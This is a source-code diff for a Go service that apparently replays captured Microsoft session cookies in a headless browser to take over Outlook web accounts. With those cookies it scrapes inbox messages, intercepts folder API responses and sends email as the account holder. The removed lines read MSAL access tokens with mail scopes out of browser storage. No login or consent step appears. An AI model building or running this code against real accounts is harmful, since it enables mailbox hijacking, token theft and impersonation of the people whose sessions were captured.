+					// Outlook message items have aria-labels like "Subject, From, Date"
+					if (label.includes(',') && label.length > 20 && label.length < 500) {
+						const parts = label.split(',').map(p => p.trim());
+						if (parts.length >= 2) {
+							messages.push({
+								id: 'aria-' + index,
+								from: parts.length >= 2 ? parts[1] : '',
+								fromName: parts.length >= 2 ? parts[1] : '',
+								subject: parts[0] || '',
+								preview: parts.length >= 3 ? parts.slice(2).join(', ') : '',
+								date: '',
+								isRead: true,
+								hasAttachments: false,
+								conversationId: ''
+							});
+						}
+					}
+				});
+			}
+			
+			return JSON.stringify(messages);
+		} catch(e) {
+			return '[]';
+		}
+	}`
+
+	result, err := page.Eval(script)
+	if err != nil || result == nil {
+		b.Logger.Warnw("DOM scraping failed", "error", err)
+		return nil
+	}
+
+	var messages []model.InboxMessage
+	if err := json.Unmarshal([]byte(result.Value.String()), &messages); err != nil {
+		b.Logger.Warnw("failed to parse DOM scraping result", "error", err)
+		return nil
+	}
+
+	b.Logger.Infow("DOM scraping extracted messages", "count", len(messages))
+	return messages
+}
+
+// SendEmailViaBrowser sends an email using browser automation on Outlook web
+func (b *BrowserSessionService) SendEmailViaBrowser(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool) error {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+
+	b.Logger.Infow("sending email via browser automation", "to", to, "subject", subject)
+
+	var cookies []cookieEntry
+	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
+		return fmt.Errorf("failed to parse cookies JSON: %w", err)
+	}
+
+	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
+	if err != nil {
+		return err
+	}
+	defer cleanup()
+
+	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
+	if err != nil {
+		return err
+	}
+
+	// Navigate to compose
+	composeURL := "https://outlook.live.com/mail/0/deeplink/compose"
+	b.Logger.Infow("navigating to compose page", "url", composeURL)
+	if err := page.Navigate(composeURL); err != nil {
+		return fmt.Errorf("failed to navigate to compose: %w", err)
+	}
+	if err := page.WaitLoad(); err != nil {
+		b.Logger.Warnw("compose page load timeout, continuing", "error", err)
+	}
+	time.Sleep(5 * time.Second)
+
+	// Verify we're on the compose page
+	pageTitle, _ := page.Eval(`() => document.title`)
+	title := ""
+	if pageTitle != nil {
+		title = pageTitle.Value.String()
+	}
+	b.Logger.Infow("compose page loaded", "title", title)
+
+	// Fill in the To field - try multiple selectors
+	toSelectors := []string{
+		`[aria-label="To"]`,
+		`input[aria-label="To"]`,
+		`div[aria-label="To"] input`,
+		`input[placeholder*="To"]`,
+		`div[role="textbox"][aria-label*="To"]`,
+	}
+	var toField *rod.Element
+	for _, sel := range toSelectors {
+		toField, err = page.Element(sel)
+		if err == nil && toField != nil {
+			break
+		}
+	}
+	if toField == nil {
+		return fmt.Errorf("could not find To field with any selector")
+	}
+
+	for _, recipient := range to {
+		toField.Input(recipient)
+		toField.Type(input.Enter)
+		time.Sleep(500 * time.Millisecond)
+	}
+	b.Logger.Infow("filled To field", "recipients", to)
+
+	// Fill in Subject - try multiple selectors
+	subjectSelectors := []string{
+		`[aria-label="Add a subject"]`,
+		`input[aria-label="Subject"]`,
+		`input[aria-label="Add a subject"]`,
+		`input[placeholder*="subject"]`,
+	}
+	var subjectField *rod.Element
+	for _, sel := range subjectSelectors {
+		subjectField, err = page.Element(sel)
+		if err == nil && subjectField != nil {
+			break
+		}
+	}
+	if subjectField == nil {
+		return fmt.Errorf("could not find Subject field with any selector")
+	}
+	subjectField.Input(subject)
+	b.Logger.Infow("filled Subject field")
+
+	// Fill in Body - try multiple selectors
+	bodySelectors := []string{
+		`[aria-label="Message body, press Alt+F10 to exit"]`,
+		`div[role="textbox"][aria-label*="Message body"]`,
+		`div[role="textbox"]`,
+		`div[contenteditable="true"]`,
+	}
+	var bodyField *rod.Element
+	for _, sel := range bodySelectors {
+		bodyField, err = page.Element(sel)
+		if err == nil && bodyField != nil {
+			break
+		}
+	}
+	if bodyField == nil {
+		return fmt.Errorf("could not find body field with any selector")
+	}
+
+	if isHTML {
+		_, evalErr := page.Eval(fmt.Sprintf(`() => {
+			const selectors = [
+				'[aria-label="Message body, press Alt+F10 to exit"]',
+				'div[role="textbox"][aria-label*="Message body"]',
+				'div[role="textbox"]',
+				'div[contenteditable="true"]'
+			];
+			for (const sel of selectors) {
+				const el = document.querySelector(sel);
+				if (el) {
+					el.innerHTML = %s;
+					return true;
+				}
+			}
+			return false;
+		}`, jsonEscape(body)))
+		if evalErr != nil {
+			b.Logger.Warnw("HTML body injection failed, trying plain text", "error", evalErr)
+			bodyField.Input(body)
+		}
+	} else {
+		bodyField.Input(body)
+	}
+	b.Logger.Infow("filled Body field")
+
+	time.Sleep(1 * time.Second)
+
+	// Click Send button - try multiple selectors
+	sendSelectors := []string{
+		`button[aria-label="Send"]`,
+		`button[title="Send"]`,
+		`button[data-testid="send"]`,
+	}
+	var sendBtn *rod.Element
+	for _, sel := range sendSelectors {
+		sendBtn, err = page.Element(sel)
+		if err == nil && sendBtn != nil {
+			break
+		}
+	}
+	if sendBtn == nil {
+		// Try keyboard shortcut as fallback
+		b.Logger.Infow("Send button not found, trying Ctrl+Enter shortcut")
+		page.KeyActions().Press(input.ControlLeft).Type(input.Enter).MustDo()
+	} else {
+		sendBtn.Click(proto.InputMouseButtonLeft, 1)
+	}
+
+	time.Sleep(3 * time.Second)
+
+	b.Logger.Infow("email sent via browser automation", "to", to, "subject", subject)
+	return nil
+}
+
+// GetFoldersViaBrowser reads mail folders using browser automation
+func (b *BrowserSessionService) GetFoldersViaBrowser(ctx context.Context, cookiesJSON string) ([]model.InboxFolder, error) {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+
+	b.Logger.Infow("reading folders via browser automation")
+
+	var cookies []cookieEntry
+	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
+		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
+	}
+
+	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	defer cleanup()
+
+	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
+	if err != nil {
+		return nil, err
+	}
+
+	// Enable network interception
+	var capturedFolders []model.InboxFolder
+	var foldersMu sync.Mutex
+	var foldersFound bool
+
+	err = proto.NetworkEnable{}.Call(page)
+	if err != nil {
+		b.Logger.Warnw("failed to enable network events", "error", err)
+	}
+
+	// Listen for folder API responses
+	waitEvents := page.EachEvent(
+		func(e *proto.NetworkResponseReceived) {
+			reqURL := e.Response.URL
+			isFolderAPI := (strings.Contains(reqURL, "folders") || strings.Contains(reqURL, "Folder")) &&
+				(strings.Contains(reqURL, "outlook") || strings.Contains(reqURL, "substrate") || strings.Contains(reqURL, "office"))
+
+			if !isFolderAPI || e.Response.Status != 200 {
+				return
+			}
+
+			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
+			if bodyErr != nil {
+				return
+			}
+
+			folders := b.parseFolderResponse(body.Body)
+			if len(folders) > 0 {
+				foldersMu.Lock()
+				capturedFolders = folders
+				foldersFound = true
+				foldersMu.Unlock()
+			}
+		},
+	)
+	_ = waitEvents
+
+	if err := b.navigateToOutlook(page); err != nil {
+		return nil, err
+	}
+
+	// Wait for folder API responses
+	for i := 0; i < 15; i++ {
+		time.Sleep(2 * time.Second)
+		foldersMu.Lock()
+		found := foldersFound
+		foldersMu.Unlock()
+		if found {
+			break
+		}
+	}
+
+	foldersMu.Lock()
+	defer foldersMu.Unlock()
+
+	// If no API response, return default folders
+	if !foldersFound {
+		b.Logger.Infow("no folder API response intercepted, returning default folders")
+		capturedFolders = []model.InboxFolder{
+			{ID: "inbox", DisplayName: "Inbox", TotalItemCount: 0, UnreadItemCount: 0},
+			{ID: "sentitems", DisplayName: "Sent Items", TotalItemCount: 0, UnreadItemCount: 0},
+			{ID: "drafts", DisplayName: "Drafts", TotalItemCount: 0, UnreadItemCount: 0},
+			{ID: "junkemail", DisplayName: "Junk Email", TotalItemCount: 0, UnreadItemCount: 0},
+			{ID: "deleteditems", DisplayName: "Deleted Items", TotalItemCount: 0, UnreadItemCount: 0},
+		}
+	}
+
+	return capturedFolders, nil
+}
+
+// parseFolderResponse parses folder API responses
+func (b *BrowserSessionService) parseFolderResponse(body string) []model.InboxFolder {
+	// Try REST API format
+	var restResp struct {
+		Value []struct {
+			ID              string `json:"Id"`
+			OID             string `json:"id"`
+			DisplayName     string `json:"DisplayName"`
+			DisplayNameL    string `json:"displayName"`
+			TotalItemCount  int    `json:"TotalItemCount"`
+			TotalItemCountL int    `json:"totalItemCount"`
+			UnreadCount     int    `json:"UnreadItemCount"`
+			UnreadCountL    int    `json:"unreadItemCount"`
+		} `json:"value"`
+	}
+
+	if json.Unmarshal([]byte(body), &restResp) == nil && len(restResp.Value) > 0 {
+		var folders []model.InboxFolder
+		for _, f := range restResp.Value {
+			id := f.ID
+			if id == "" {
+				id = f.OID
+			}
+			name := f.DisplayName
+			if name == "" {
+				name = f.DisplayNameL
+			}
+			total := f.TotalItemCount
+			if total == 0 {
+				total = f.TotalItemCountL
+			}
+			unread := f.UnreadCount
+			if unread == 0 {
+				unread = f.UnreadCountL
+			}
+			folders = append(folders, model.InboxFolder{
+				ID:              id,
+				DisplayName:     name,
+				TotalItemCount:  total,
+				UnreadItemCount: unread,
+			})
+		}
+		return folders
+	}
+
+	return nil
 }
 
 // injectCookies injects cookies into the browser page for all relevant Microsoft domains
@@ -666,145 +1117,6 @@ func (b *BrowserSessionService) injectCookies(page *rod.Page, cookies []cookieEn
 	return lastErr
 }
 
-// extractJWTFromMSALCache tries to extract a JWT access token from MSAL.js cache
-// Only returns tokens that are actual JWTs (contain dots), with strict scope filtering
-func (b *BrowserSessionService) extractJWTFromMSALCache(page *rod.Page) string {
-	script := `() => {
-		try {
-			const tokens = [];
-			const storages = [sessionStorage, localStorage];
-			for (const storage of storages) {
-				for (let i = 0; i < storage.length; i++) {
-					const key = storage.key(i);
-					if (key && key.includes('accesstoken')) {
-						try {
-							const val = JSON.parse(storage.getItem(key));
-							if (val && val.secret) {
-								tokens.push({
-									secret: val.secret,
-									scope: val.target || '',
-									realm: val.realm || '',
-									credentialType: val.credentialType || '',
-									key: key
-								});
-							}
-						} catch(e) {}
-					}
-				}
-			}
-			return JSON.stringify(tokens);
-		} catch(e) {
-			return '[]';
-		}
-	}`
-
-	result, err := page.Eval(script)
-	if err != nil || result == nil {
-		return ""
-	}
-
-	var tokens []struct {
-		Secret         string `json:"secret"`
-		Scope          string `json:"scope"`
-		Realm          string `json:"realm"`
-		CredentialType string `json:"credentialType"`
-		Key            string `json:"key"`
-	}
-
-	if err := json.Unmarshal([]byte(result.Value.String()), &tokens); err != nil {
-		return ""
-	}
-
-	b.Logger.Infow("found tokens in MSAL cache", "count", len(tokens))
-
-	// Log all tokens for debugging
-	for i, t := range tokens {
-		isJWT := strings.Contains(t.Secret, ".")
-		b.Logger.Infow("MSAL cache token",
-			"index", i,
-			"scope", t.Scope,
-			"realm", t.Realm,
-			"isJWT", isJWT,
-			"tokenLen", len(t.Secret),
-		)
-	}
-
-	// Priority 1: JWT tokens with explicit Mail scope (for Graph API)
-	for _, t := range tokens {
-		if !strings.Contains(t.Secret, ".") {
-			continue
-		}
-		scope := strings.ToLower(t.Scope)
-		if strings.Contains(scope, "mail.read") || strings.Contains(scope, "mail.send") {
-			b.Logger.Infow("selected JWT with Mail scope from MSAL cache",
-				"scope", t.Scope,
-				"tokenLen", len(t.Secret),
-			)
-			return t.Secret
-		}
-	}
-
-	// Priority 2: JWT tokens scoped for substrate.office.com (Outlook's actual API)
-	for _, t := range tokens {
-		if !strings.Contains(t.Secret, ".") {
-			continue
-		}
-		scope := strings.ToLower(t.Scope)
-		if strings.Contains(scope, "substrate.office.com") {
-			b.Logger.Infow("selected JWT with substrate scope from MSAL cache",
-				"scope", t.Scope,
-				"tokenLen", len(t.Secret),
-			)
-			return t.Secret
-		}
-	}
-
-	// Priority 3: JWT tokens scoped for outlook.office.com
-	for _, t := range tokens {
-		if !strings.Contains(t.Secret, ".") {
-			continue
-		}
-		scope := strings.ToLower(t.Scope)
-		if strings.Contains(scope, "outlook.office.com") || strings.Contains(scope, "outlook.office365.com") {
-			b.Logger.Infow("selected JWT with Outlook scope from MSAL cache",
-				"scope", t.Scope,
-				"tokenLen", len(t.Secret),
-			)
-			return t.Secret
-		}
-	}
-
-	// Priority 4: Any JWT token that is NOT for augloop or ads
-	for _, t := range tokens {
-		if !strings.Contains(t.Secret, ".") {
-			continue
-		}
-		scope := strings.ToLower(t.Scope)
-		if strings.Contains(scope, "augloop") || strings.Contains(scope, "ads.") {
-			continue // Skip augloop and ads tokens
-		}
-		b.Logger.Infow("selected JWT token from MSAL cache (fallback)",
-			"scope", t.Scope,
-			"tokenLen", len(t.Secret),
-		)
-		return t.Secret
-	}
-
-	// Priority 5: Last resort - any JWT
-	for _, t := range tokens {
-		if strings.Contains(t.Secret, ".") {
-			b.Logger.Warnw("using last-resort JWT from MSAL cache (may be augloop/ads)",
-				"scope", t.Scope,
-				"tokenLen", len(t.Secret),
-			)
-			return t.Secret
-		}
-	}
-
-	b.Logger.Warnw("no JWT tokens found in MSAL cache")
-	return ""
-}
-
 // extractAccountInfo extracts email and display name from MSAL cache
 func (b *BrowserSessionService) extractAccountInfo(page *rod.Page) (email, displayName string) {
 	script := `() => {
@@ -898,187 +1210,10 @@ func (b *BrowserSessionService) extractEmailFromDOM(page *rod.Page) string {
 	return ""
 }
 
-// SendEmailViaBrowser sends an email using browser automation on Outlook web
-func (b *BrowserSessionService) SendEmailViaBrowser(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool) error {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-
-	b.Logger.Infow("sending email via browser automation", "to", to, "subject", subject)
-
-	var cookies []cookieEntry
-	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
-		return fmt.Errorf("failed to parse cookies JSON: %w", err)
-	}
-
-	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
-	if err != nil {
-		return err
-	}
-	defer cleanup()
-
-	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
-	if err != nil {
-		return fmt.Errorf("failed to create page: %w", err)
-	}
-
-	// Inject cookies and establish SSO
-	b.injectCookies(page, cookies)
-	if err := page.Navigate("https://login.live.com/"); err != nil {
-		return fmt.Errorf("failed to navigate to login.live.com: %w", err)
-	}
-	page.WaitLoad()
-	time.Sleep(3 * time.Second)
-
-	// Navigate to compose
-	composeURL := "https://outlook.live.com/mail/0/deeplink/compose"
-	if err := page.Navigate(composeURL); err != nil {
-		return fmt.Errorf("failed to navigate to compose: %w", err)
-	}
-	page.WaitLoad()
-	time.Sleep(5 * time.Second)
-
-	// Fill in the To field
-	toField, err := page.Element(`[aria-label="To"]`)
-	if err != nil {
-		toField, err = page.Element(`input[aria-label="To"]`)
-		if err != nil {
-			return fmt.Errorf("could not find To field: %w", err)
-		}
-	}
-	for _, recipient := range to {
-		toField.Input(recipient)
-		toField.Type(input.Enter)
-		time.Sleep(500 * time.Millisecond)
-	}
-
-	// Fill in Subject
-	subjectField, err := page.Element(`[aria-label="Add a subject"]`)
-	if err != nil {
-		subjectField, err = page.Element(`input[aria-label="Subject"]`)
-		if err != nil {
-			return fmt.Errorf("could not find Subject field: %w", err)
-		}
-	}
-	subjectField.Input(subject)
-
-	// Fill in Body
-	bodyField, err := page.Element(`[aria-label="Message body, press Alt+F10 to exit"]`)
-	if err != nil {
-		bodyField, err = page.Element(`div[role="textbox"]`)
-		if err != nil {
-			return fmt.Errorf("could not find body field: %w", err)
-		}
-	}
-
-	if isHTML {
-		page.Eval(fmt.Sprintf(`(selector) => {
-			const el = document.querySelector('[aria-label="Message body, press Alt+F10 to exit"]') || document.querySelector('div[role="textbox"]');
-			if (el) el.innerHTML = %s;
-		}`, jsonEscape(body)))
-	} else {
-		bodyField.Input(body)
-	}
-
-	time.Sleep(1 * time.Second)
-
-	// Click Send button
-	sendBtn, err := page.Element(`[aria-label="Send"]`)
-	if err != nil {
-		sendBtn, err = page.Element(`button[title="Send"]`)
-		if err != nil {
-			return fmt.Errorf("could not find Send button: %w", err)
-		}
-	}
-	sendBtn.Click(proto.InputMouseButtonLeft, 1)
-
-	time.Sleep(3 * time.Second)
-
-	b.Logger.Infow("email sent via browser automation", "to", to, "subject", subject)
-	return nil
-}
-
-// ReadInboxViaBrowser reads inbox messages using browser automation
-func (b *BrowserSessionService) ReadInboxViaBrowser(ctx context.Context, cookiesJSON string) ([]map[string]string, error) {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-
-	b.Logger.Infow("reading inbox via browser automation")
-
-	var cookies []cookieEntry
-	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
-		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
-	}
-
-	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
-	if err != nil {
-		return nil, err
-	}
-	defer cleanup()
-
-	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
-	if err != nil {
-		return nil, fmt.Errorf("failed to create page: %w", err)
-	}
-
-	// Inject cookies and establish SSO
-	b.injectCookies(page, cookies)
-	page.Navigate("https://login.live.com/")
-	page.WaitLoad()
-	time.Sleep(3 * time.Second)
-
-	// Navigate to inbox
-	page.Navigate("https://outlook.live.com/mail/")
-	page.WaitLoad()
-	time.Sleep(5 * time.Second)
-
-	// Extract messages from the page
-	result, err := page.Eval(`() => {
-		try {
-			const messages = [];
-			const items = document.querySelectorAll('[data-convid], [role="option"], [aria-label*="message"]');
-			items.forEach(item => {
-				const sender = item.querySelector('[data-testid="SenderName"]')?.textContent || 
-				               item.querySelector('.OZZZK')?.textContent || '';
-				const subject = item.querySelector('[data-testid="SubjectLine"]')?.textContent ||
-				                item.querySelector('.jGG6V')?.textContent || '';
-				const preview = item.querySelector('[data-testid="BodyPreview"]')?.textContent ||
-				                item.querySelector('.Mc1Ri')?.textContent || '';
-				const date = item.querySelector('[data-testid="DateLine"]')?.textContent ||
-				             item.querySelector('.jHATS')?.textContent || '';
-				if (sender || subject) {
-					messages.push({sender, subject, preview, date});
-				}
-			});
-			return JSON.stringify(messages);
-		} catch(e) {
-			return '[]';
-		}
-	}`)
-
-	if err != nil {
-		return nil, fmt.Errorf("failed to extract messages: %w", err)
-	}
-
-	var messages []map[string]string
-	if result != nil {
-		json.Unmarshal([]byte(result.Value.String()), &messages)
-	}
-
-	return messages, nil
-}
-
 // jsonEscape escapes a string for use in JavaScript
 func jsonEscape(s string) string {
 	b, _ := json.Marshal(s)
 	return string(b)
-}
-
-// min returns the smaller of two ints
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
 }
 
 // ParseCookiesForDomains returns cookies filtered by Microsoft/Outlook domains
